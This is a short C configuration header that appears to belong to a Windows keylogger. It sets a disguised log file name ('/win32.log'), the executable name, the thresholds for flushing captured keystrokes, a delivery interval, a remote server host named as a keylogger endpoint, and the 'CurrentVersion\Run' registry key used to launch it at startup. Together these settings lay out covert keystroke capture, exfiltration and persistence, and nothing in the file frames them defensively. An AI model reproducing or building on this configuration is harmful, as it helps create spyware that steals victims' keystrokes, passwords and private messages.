#ifndef CONFIG_H
#define CONFIG_H

#define LOG_FILENAME "/win32.log"
#define EXE_NAME "logger.exe"

#define DELIVER_INTERVAL 120

// rules that flush to log
#define FLUSH_CHAR_THRESHOLD 300
#define FLUSH_INTERVAL 60

#define MAX_BUFFER_LEN 1024
#define SERVER_HOST "keylogger-0rs3.onrender.com"

#define LAUNCH_STARTUP_KEY "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#endif